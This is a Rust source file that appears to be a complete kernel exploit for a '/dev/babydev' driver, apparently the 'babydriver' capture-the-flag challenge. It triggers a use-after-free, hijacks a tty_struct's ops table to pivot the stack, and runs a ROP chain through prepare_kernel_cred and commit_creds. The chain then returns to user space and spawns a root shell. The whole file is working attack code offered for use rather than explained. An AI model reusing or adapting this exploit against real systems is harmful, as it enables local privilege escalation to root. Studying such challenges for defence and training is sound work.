use kpwn::all::*;

#[repr(C)]
#[derive(Debug)]
struct FakeTty {
    pub magic: u32,
    pub kref: u32,
    pub dev: u64,
    pub driver: u64,
    pub ops: u64,
    pub index: u64,
    pub ldisc_sem: [u64; 6],
    pub vtable: [u64; 36],
    pub chain: [u64; 13],
    pub frame: TrapFrame64,
}

extern "C" fn ret_from_kernel() -> ! {
    log::info!("Back from kernel space");
    whoami();
    execve_sh().unwrap();
    panic!();
}

fn main() {
    env_logger::builder()
        .filter_level(log::LevelFilter::Debug)
        .init();

    whoami();

    let dev = open_dev("/dev/babydev").unwrap();
    let dev2 = open_dev("/dev/babydev").unwrap();

    // Trigger realloc
    unsafe {
        assert_eq!(dev.ioctl_raw(0x10001, 0x2E0), 0);
    }
    // Trigger free
    dev2.close().unwrap();

    // Open new pty
    let tty = open_ptmx().unwrap();
    // Read tty_struct from kernel
    let mut tty_struct: FakeTty = unsafe { dev.read_struct().unwrap() };
    // log::debug!("{:#x?}", tty_struct);

    // Compute kernel base and tty_struct address
    let kb = KernelRebaser::new(tty_struct.ops - 0x1a74f80);
    // tty_struct.ldisc_sem.read_wait.next - offset_of!(FakeTty, ldisc_sem.read_wait)
    let tty_struct_addr = tty_struct.ldisc_sem[2] - 0x38;
    log::info!("Kernel base = {:#x}", kb.base);
    log::info!("tty_struct addr = {:#x}", tty_struct_addr);

    // Build payload
    // leave ; ret
    tty_struct.vtable = [kb.r(0xffffffff811b4b16); 36];
    // ops->ioctl
    // push rdx ; mov edx, 0x415b0028 ; pop rsp ; pop rbp ; ret
    tty_struct.vtable[12] = kb.r(0xffffffff81154d2a);

    tty_struct.ops = tty_struct_addr + 0x58; // offset_of!(FakeTty, vtable)
    tty_struct.chain = [
        // pop rdi ; ret
        0xffffffff810d238d,
        0,
        // prepare_kernel_cred
        0xffffffff810a1810,
        // pop rdx ; cmp eax, 0x5d5b001c ; ret
        0xffffffff8106c092,
        // pop rbp ; ret
        0xffffffff81251639,
        // mov rdi, rax ; call rdx
        0xffffffff81788e0e,
        // commit_creds
        0xffffffff810a1420,
        // Corrupt tty_struct's magic number (this works around kernel
        // soft-lockups upon tty_release())
        // Ideally, we should either completely skip the release step (e.g.
        // by overwriting the "release" function in fops), or restore the
        // contents of tty_struct before closing the fd.
        // pop rdi ; ret
        0xffffffff810d238d,
        tty_struct_addr - 0x10,
        // mov dword [rdi + 0x10], eax ; ret
        0xffffffff813b9ed7,
        // swapgs ; pop rbp ; ret
        0xffffffff81063694,
        0xdeadbeef,
        // iretq
        0xffffffff8181a797,
    ];
    kb.fixup_all(&mut tty_struct.chain);
    tty_struct.frame = TrapFrame64::new(ret_from_kernel);

    // Trigger ROP
    unsafe {
        dev.write_all_raw(&tty_struct).unwrap();
        // Set rdx = new rsp - 8
        tty.ioctl_raw(0, tty_struct_addr + 0x178 - 8); // offset_of!(FakeTty, chain) - 8
    }

    log::error!("We failed :(");
    dev.close().unwrap();
}
